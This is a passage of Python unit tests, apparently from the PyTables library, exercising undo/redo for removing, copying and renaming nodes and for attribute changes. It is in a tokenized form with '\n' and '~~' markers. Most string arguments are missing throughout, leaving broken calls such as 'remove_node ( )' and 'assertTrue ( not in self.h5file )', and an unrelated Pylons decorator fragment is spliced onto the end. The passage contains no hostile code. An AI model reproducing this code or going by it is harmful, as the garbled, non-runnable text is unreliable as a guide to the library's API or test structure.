# Create a new array \n 
self . h5file . remove_node ( ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that table2 does not exist in the object tree \n 
self . assertTrue ( "/table" in self . h5file ) \n 
table = self . h5file . root . table \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertEqual ( self . h5file . root . table . title , "Indexed" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that table2 has come back to life in a sane state \n 
self . assertTrue ( "/table" not in self . h5file ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Checking remove_node (over Groups with children)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Delete a group recursively \n 
self . h5file . remove_node ( , recursive = 1 ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that parent and children has come into life in a sane state \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that parent and children are not reachable \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray1" not in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" not in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" not in self . h5file ) \n 
\n 
~~ def test01b ( self ) : \n 
~~~ """Checking remove_node (over Groups with children 2)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01b..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Remove a couple of groups \n 
self . h5file . remove_node ( , recursive = 1 ) \n 
self . h5file . remove_node ( ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that they does exist in the object tree \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup2" in self . h5file ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that groups does not exist again \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup2" not in self . h5file ) \n 
\n 
# Check that children are not reachable \n 
self . assertTrue ( "/agroup/anarray1" not in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" not in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" not in self . h5file ) \n 
\n 
\n 
~~ ~~ class CopyNodeTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Tests for copy_node and copy_children operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( CopyNodeTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
# Create a table in root \n 
populateTable ( self . h5file . root , ) \n 
\n 
~~ def test00_copyLeaf ( self ) : \n 
~~~ """Checking copy_node (over Leaves)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00_copyLeaf..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# /anarray => /agroup/agroup3/ \n 
new_node = self . h5file . copy_node ( , ) \n 
\n 
# Undo the copy. \n 
self . h5file . undo ( ) \n 
\n 
# Check that the copied node does not exist in the object tree. \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Redo the copy. \n 
self . h5file . redo ( ) \n 
\n 
# Check that the copied node exists again in the object tree. \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( self . h5file . root . agroup . agroup3 . anarray is new_node ) \n 
\n 
~~ def test00b_copyTable ( self ) : \n 
~~~ """Checking copy_node (over Tables)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00b_copyTable..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# /table => /agroup/agroup3/ \n 
warnings . filterwarnings ( "ignore" , category = UserWarning ) \n 
table = self . h5file . copy_node ( \n 
, , propindexes = True ) \n 
warnings . filterwarnings ( "default" , category = UserWarning ) \n 
self . assertTrue ( "/agroup/agroup3/table" in self . h5file ) \n 
\n 
table = self . h5file . root . agroup . agroup3 . table \n 
self . assertEqual ( table . title , "Indexed" ) \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
table = self . h5file . root . table \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
\n 
# Check that the copied node does not exist in the object tree. \n 
self . assertTrue ( "/agroup/agroup3/table" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that table has come back to life in a sane state \n 
self . assertTrue ( "/table" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3/table" in self . h5file ) \n 
table = self . h5file . root . agroup . agroup3 . table \n 
self . assertEqual ( table . title , "Indexed" ) \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
\n 
~~ def test01_copyGroup ( self ) : \n 
~~~ """Copying a group (recursively).""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01_copyGroup..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# /agroup => /acopy \n 
new_node = self . h5file . copy_node ( \n 
, newname = , recursive = True ) \n 
\n 
# Undo the copy. \n 
self . h5file . undo ( ) \n 
\n 
# Check that the copied node does not exist in the object tree. \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Redo the copy. \n 
self . h5file . redo ( ) \n 
\n 
# Check that the copied node exists again in the object tree. \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( self . h5file . root . acopy is new_node ) \n 
\n 
~~ def test02_copyLeafOverwrite ( self ) : \n 
~~~ """Copying a leaf, overwriting destination.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02_copyLeafOverwrite..." % \n 
self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# /anarray => /agroup/agroup \n 
oldNode = self . h5file . root . agroup \n 
new_node = self . h5file . copy_node ( \n 
, newname = , overwrite = True ) \n 
\n 
# Undo the copy. \n 
self . h5file . undo ( ) \n 
\n 
# Check that the copied node does not exist in the object tree. \n 
# Check that the overwritten node exists again in the object tree. \n 
self . assertTrue ( self . h5file . root . agroup is oldNode ) \n 
\n 
# Redo the copy. \n 
self . h5file . redo ( ) \n 
\n 
# Check that the copied node exists again in the object tree. \n 
# Check that the overwritten node does not exist in the object tree. \n 
self . assertTrue ( self . h5file . root . agroup is new_node ) \n 
\n 
~~ def test03_copyChildren ( self ) : \n 
~~~ """Copying the children of a group""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03_copyChildren..." % \n 
self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# /agroup/* => /agroup/ \n 
self . h5file . copy_children ( , , recursive = True ) \n 
\n 
# Undo the copy. \n 
self . h5file . undo ( ) \n 
\n 
# Check that the copied nodes do not exist in the object tree. \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Redo the copy. \n 
self . h5file . redo ( ) \n 
\n 
# Check that the copied nodes exist again in the object tree. \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
\n 
\n 
~~ ~~ class ComplexTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Tests for a mix of all operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( ComplexTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Mix of create_array, create_group, renameNone, move_node,\n        remove_node, copy_node and copy_children.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create an array \n 
self . h5file . create_array ( self . h5file . root , , \n 
[ 1 ] , "Array title 3" ) \n 
# Create a group \n 
self . h5file . create_group ( self . h5file . root , , "Group title 3" ) \n 
\n 
# /anarray => /agroup/agroup3/ \n 
new_node = self . h5file . copy_node ( , ) \n 
new_node = self . h5file . copy_children ( \n 
, , recursive = 1 ) \n 
\n 
# rename anarray \n 
self . h5file . rename_node ( , ) \n 
\n 
# Move anarray \n 
new_node = self . h5file . copy_node ( , ) \n 
\n 
# Remove anarray4 \n 
self . h5file . remove_node ( ) \n 
\n 
# Undo the actions \n 
self . h5file . undo ( ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
\n 
# Redo the actions \n 
self . h5file . redo ( ) \n 
\n 
# Check that the copied node exists again in the object tree. \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( self . h5file . root . agroup . anarray3 is new_node ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Test with multiple generations (Leaf case)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# remove /anarray \n 
self . h5file . remove_node ( ) \n 
\n 
# Create an array in the same place \n 
self . h5file . create_array ( self . h5file . root , , \n 
[ 2 ] , "Array title 2" ) \n 
# remove the array again \n 
self . h5file . remove_node ( ) \n 
\n 
# Create an array \n 
self . h5file . create_array ( self . h5file . root , , \n 
[ 3 ] , "Array title 3" ) \n 
# remove the array again \n 
self . h5file . remove_node ( ) \n 
\n 
# Create an array \n 
self . h5file . create_array ( self . h5file . root , , \n 
[ 4 ] , "Array title 4" ) \n 
# Undo the actions \n 
self . h5file . undo ( ) \n 
\n 
# Check that /anarray is in the correct state before redoing \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
self . assertEqual ( self . h5file . root . anarray [ : ] , [ 1 ] ) \n 
\n 
# Redo the actions \n 
self . h5file . redo ( ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title 4" ) \n 
self . assertEqual ( self . h5file . root . anarray [ : ] , [ 4 ] ) \n 
\n 
~~ def test02 ( self ) : \n 
~~~ """Test with multiple generations (Group case)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# remove /agroup \n 
self . h5file . remove_node ( ) \n 
\n 
# Create a group in the same place \n 
self . h5file . create_group ( self . h5file . root , , "Group title 22" ) \n 
\n 
# remove the group \n 
self . h5file . remove_node ( ) \n 
\n 
# Create a group \n 
self . h5file . create_group ( self . h5file . root , , "Group title 3" ) \n 
\n 
# remove the group \n 
self . h5file . remove_node ( ) \n 
\n 
# Create a group \n 
self . h5file . create_group ( self . h5file . root , , "Group title 4" ) \n 
\n 
# Create a child group \n 
self . h5file . create_group ( self . h5file . root . agroup2 , , \n 
"Group title 5" ) \n 
\n 
# Undo the actions \n 
self . h5file . undo ( ) \n 
\n 
# Check that /agroup is in the state before enabling do/undo \n 
self . assertEqual ( self . h5file . root . agroup2 . _v_title , "Group title 2" ) \n 
self . assertTrue ( in self . h5file ) \n 
\n 
# Redo the actions \n 
self . h5file . redo ( ) \n 
self . assertEqual ( self . h5file . root . agroup2 . _v_title , "Group title 4" ) \n 
self . assertEqual ( self . h5file . root . agroup2 . agroup5 . _v_title , \n 
"Group title 5" ) \n 
\n 
~~ def test03 ( self ) : \n 
~~~ """Test with multiple generations (Group case, recursive remove)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# remove /agroup \n 
self . h5file . remove_node ( , recursive = 1 ) \n 
\n 
# Create a group in the same place \n 
self . h5file . create_group ( self . h5file . root , , "Group title 2" ) \n 
\n 
# remove the group \n 
self . h5file . remove_node ( ) \n 
\n 
# Create a group \n 
self . h5file . create_group ( self . h5file . root , , "Group title 3" ) \n 
\n 
# remove the group \n 
self . h5file . remove_node ( ) \n 
\n 
# Create a group \n 
self . h5file . create_group ( self . h5file . root , , "Group title 4" ) \n 
\n 
# Create a child group \n 
self . h5file . create_group ( self . h5file . root . agroup , , \n 
"Group title 5" ) \n 
# Undo the actions \n 
self . h5file . undo ( ) \n 
\n 
# Check that /agroup is in the state before enabling do/undo \n 
self . assertTrue ( in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Redo the actions \n 
self . h5file . redo ( ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title 4" ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertEqual ( \n 
self . h5file . root . agroup . agroup5 . _v_title , "Group title 5" ) \n 
\n 
~~ def test03b ( self ) : \n 
~~~ """Test with multiple generations (Group case, recursive remove,\n        case 2)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03b..." % self . __class__ . __name__ ) \n 
\n 
# Enable undo/redo. \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new group with a child \n 
self . h5file . create_group ( self . h5file . root , , "Group title 3" ) \n 
self . h5file . create_group ( self . h5file . root . agroup3 , , \n 
"Group title 4" ) \n 
\n 
# remove /agroup3 \n 
self . h5file . remove_node ( , recursive = 1 ) \n 
\n 
# Create a group in the same place \n 
self . h5file . create_group ( self . h5file . root , , "Group title 4" ) \n 
\n 
# Undo the actions \n 
self . h5file . undo ( ) \n 
\n 
# Check that /agroup is in the state before enabling do/undo \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Redo the actions \n 
self . h5file . redo ( ) \n 
self . assertEqual ( self . h5file . root . agroup3 . _v_title , "Group title 4" ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
\n 
~~ ~~ class AttributesTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Tests for operation on attributes""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( AttributesTestCase , self ) . setUp ( ) \n 
\n 
# Create an array. \n 
array = self . h5file . create_array ( , , [ 1 , 2 ] ) \n 
\n 
# Set some attributes on it. \n 
attrs = array . attrs \n 
attrs . attr_1 = 10 \n 
attrs . attr_2 = 20 \n 
attrs . attr_3 = 30 \n 
\n 
~~ def test00_setAttr ( self ) : \n 
~~~ """Setting a nonexistent attribute""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00_setAttr..." % self . __class__ . __name__ ) \n 
\n 
~~ array = self . h5file . root . array \n 
attrs = array . attrs \n 
\n 
self . h5file . enable_undo ( ) \n 
setattr ( attrs , , 0 ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_0 , 0 ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( not in attrs ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_0 , 0 ) \n 
\n 
~~ def test01_setAttrExisting ( self ) : \n 
~~~ """Setting an existing attribute""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01_setAttrExisting..." % \n 
self . __class__ . __name__ ) \n 
\n 
~~ array = self . h5file . root . array \n 
attrs = array . attrs \n 
\n 
self . h5file . enable_undo ( ) \n 
setattr ( attrs , , 11 ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_1 , 11 ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_1 , 10 ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_1 , 11 ) \n 
\n 
~~ def test02_delAttr ( self ) : \n 
~~~ """Removing an attribute""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02_delAttr..." % self . __class__ . __name__ ) \n 
\n 
~~ array = self . h5file . root . array \n 
attrs = array . attrs \n 
\n 
self . h5file . enable_undo ( ) \n 
delattr ( attrs , ) \n 
self . assertTrue ( not in attrs ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( in attrs ) \n 
self . assertEqual ( attrs . attr_1 , 10 ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( not in attrs ) \n 
\n 
~~ def test03_copyNodeAttrs ( self ) : \n 
~~~ """Copying an attribute set""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03_copyNodeAttrs..." % \n 
self . __class__ . __name__ ) \n 
\n 
~~ rattrs = self . h5file . root . _v_attrs \n 
rattrs . attr_0 = 0 \n 
rattrs . attr_1 = 100 \n 
\n 
array = self . h5file . root . array \n 
attrs = array . attrs \n 
\n 
self . h5file . enable_undo ( ) \n 
attrs . _f_copy ( self . h5file . root ) \n 
self . assertEqual ( rattrs . attr_0 , 0 ) \n 
self . assertEqual ( rattrs . attr_1 , 10 ) \n 
self . assertEqual ( rattrs . attr_2 , 20 ) \n 
self . assertEqual ( rattrs . attr_3 , 30 ) \n 
self . h5file . undo ( ) \n 
self . assertEqual ( rattrs . attr_0 , 0 ) \n 
self . assertEqual ( rattrs . attr_1 , 100 ) \n 
self . assertTrue ( not in rattrs ) \n 
self . assertTrue ( not in rattrs ) \n 
self . h5file . redo ( ) \n 
self . assertEqual ( rattrs . attr_0 , 0 ) \n 
self . assertEqual ( rattrs . attr_1 , 10 ) \n 
self . assertEqual ( rattrs . attr_2 , 20 ) \n 
self . assertEqual ( rattrs . attr_3 , 30 ) \n 
\n 
~~ def test04_replaceNode ( self ) : \n 
~~~ """Replacing a node with a rewritten attribute""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test04_replaceNode..." % self . __class__ . __name__ ) \n 
\n 
~~ array = self . h5file . root . array \n 
attrs = array . attrs \n 
\n 
self . h5file . enable_undo ( ) \n 
attrs . attr_1 = 11 \n 
self . h5file . remove_node ( ) \n 
arr = self . h5file . create_array ( , , [ 1 ] ) \n 
arr . attrs . attr_1 = 12 \n 
self . h5file . undo ( ) \n 
self . assertTrue ( in self . h5file . root . array . attrs ) \n 
self . assertEqual ( self . h5file . root . array . attrs . attr_1 , 10 ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( in self . h5file . root . array . attrs ) \n 
self . assertEqual ( self . h5file . root . array . attrs . attr_1 , 12 ) \n 
\n 
\n 
~~ ~~ class NotLoggedTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test not logged nodes.""" \n 
\n 
class NotLoggedArray ( NotLoggedMixin , tables . Array ) : \n 
~~~ pass \n 
\n 
~~ def test00_hierarchy ( self ) : \n 
~~~ """Performing hierarchy operations on a not logged node.""" \n 
\n 
self . h5file . create_group ( , ) \n 
self . h5file . enable_undo ( ) \n 
\n 
# Node creation is not undone. \n 
arr = self . NotLoggedArray ( self . h5file . root , , \n 
[ 1 ] , self . _getMethodName ( ) ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( in self . h5file ) \n 
\n 
# Node movement is not undone. \n 
arr . move ( ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( in self . h5file ) \n 
\n 
# Node removal is not undone. \n 
arr . remove ( ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
~~ def test01_attributes ( self ) : \n 
~~~ """Performing attribute operations on a not logged node.""" \n 
\n 
arr = self . NotLoggedArray ( self . h5file . root , , \n 
[ 1 ] , self . _getMethodName ( ) ) \n 
self . h5file . enable_undo ( ) \n 
\n 
# Attribute creation is not undone. \n 
arr . _v_attrs . foo = \n 
self . h5file . undo ( ) \n 
self . assertEqual ( arr . _v_attrs . foo , ) \n 
\n 
# Attribute change is not undone. \n 
arr . _v_attrs . foo = \n 
self . h5file . undo ( ) \n 
self . assertEqual ( arr . _v_attrs . foo , ) \n 
\n 
# Attribute removal is not undone. \n 
del arr . _v_attrs . foo \n 
self . h5file . undo ( ) \n 
self . assertRaises ( AttributeError , getattr , arr . _v_attrs , ) \n 
\n 
\n 
~~ ~~ class CreateParentsTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test the ``createparents`` flag.""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( CreateParentsTestCase , self ) . setUp ( ) \n 
g1 = self . h5file . create_group ( , ) \n 
self . h5file . create_group ( g1 , ) \n 
\n 
~~ def existing ( self , paths ) : \n 
~~~ """Return a set of the existing paths in `paths`.""" \n 
return frozenset ( path for path in paths if path in self . h5file ) \n 
\n 
~~ def basetest ( self , doit , pre , post ) : \n 
~~~ pre ( ) \n 
self . h5file . enable_undo ( ) \n 
\n 
paths = [ , , , ] \n 
for newpath in paths : \n 
~~~ before = self . existing ( paths ) \n 
doit ( newpath ) \n 
after = self . existing ( paths ) \n 
self . assertTrue ( after . issuperset ( before ) ) \n 
\n 
self . h5file . undo ( ) \n 
post ( newpath ) \n 
after = self . existing ( paths ) \n 
self . assertEqual ( after , before ) \n 
\n 
~~ ~~ def test00_create ( self ) : \n 
~~~ """Test creating a node.""" \n 
\n 
def pre ( ) : \n 
~~~ pass \n 
\n 
~~ def doit ( newpath ) : \n 
~~~ self . h5file . create_array ( newpath , , [ 1 ] , createparents = True ) \n 
self . assertTrue ( join_path ( newpath , ) in self . h5file ) \n 
\n 
~~ def post ( newpath ) : \n 
~~~ self . assertTrue ( join_path ( newpath , ) not in self . h5file ) \n 
~~ self . basetest ( doit , pre , post ) \n 
\n 
~~ def test01_move ( self ) : \n 
~~~ """Test moving a node.""" \n 
\n 
def pre ( ) : \n 
~~~ self . h5file . create_array ( , , [ 1 ] ) \n 
\n 
~~ def doit ( newpath ) : \n 
~~~ self . h5file . move_node ( , newpath , createparents = True ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( join_path ( newpath , ) in self . h5file ) \n 
\n 
~~ def post ( newpath ) : \n 
~~~ self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( join_path ( newpath , ) not in self . h5file ) \n 
~~ self . basetest ( doit , pre , post ) \n 
\n 
~~ def test02_copy ( self ) : \n 
~~~ """Test copying a node.""" \n 
\n 
def pre ( ) : \n 
~~~ self . h5file . create_array ( , , [ 1 ] ) \n 
\n 
~~ def doit ( newpath ) : \n 
~~~ self . h5file . copy_node ( , newpath , createparents = True ) \n 
self . assertTrue ( join_path ( newpath , ) in self . h5file ) \n 
\n 
~~ def post ( newpath ) : \n 
~~~ self . assertTrue ( join_path ( newpath , ) not in self . h5file ) \n 
~~ self . basetest ( doit , pre , post ) \n 
\n 
~~ def test03_copyChildren ( self ) : \n 
~~~ """Test copying the children of a group.""" \n 
\n 
def pre ( ) : \n 
~~~ g = self . h5file . create_group ( , ) \n 
self . h5file . create_array ( g , , [ 1 ] ) \n 
self . h5file . create_array ( g , , [ 1 ] ) \n 
\n 
~~ def doit ( newpath ) : \n 
~~~ self . h5file . copy_children ( , newpath , createparents = True ) \n 
self . assertTrue ( join_path ( newpath , ) in self . h5file ) \n 
self . assertTrue ( join_path ( newpath , ) in self . h5file ) \n 
\n 
~~ def post ( newpath ) : \n 
~~~ self . assertTrue ( join_path ( newpath , ) not in self . h5file ) \n 
self . assertTrue ( join_path ( newpath , ) not in self . h5file ) \n 
~~ self . basetest ( doit , pre , post ) \n 
\n 
\n 
~~ ~~ def suite ( ) : \n 
~~~ theSuite = unittest . TestSuite ( ) \n 
niter = 1 \n 
# common.heavy = 1  # uncomment this only for testing purposes \n 
\n 
for n in range ( niter ) : \n 
~~~ theSuite . addTest ( unittest . makeSuite ( BasicTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( PersistenceTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( CreateArrayTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( CreateGroupTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( RenameNodeTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( MoveNodeTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( RemoveNodeTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( CopyNodeTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( AttributesTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( ComplexTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( NotLoggedTestCase ) ) \n 
theSuite . addTest ( unittest . makeSuite ( CreateParentsTestCase ) ) \n 
~~ if common . heavy : \n 
~~~ pass \n 
\n 
~~ return theSuite \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
common . parse_argv ( sys . argv ) \n 
common . print_versions ( ) \n 
unittest . main ( defaultTest = ) \n 
\n 
## Local Variables: \n 
## mode: python \n 
## End: \n 
~~ """Decorator internal utilities""" \n 
import pylons \n 
from pylons . controllers import WSGIController \n 
\n 
\n 
def get_pylons ( decorator_args ) : \n 
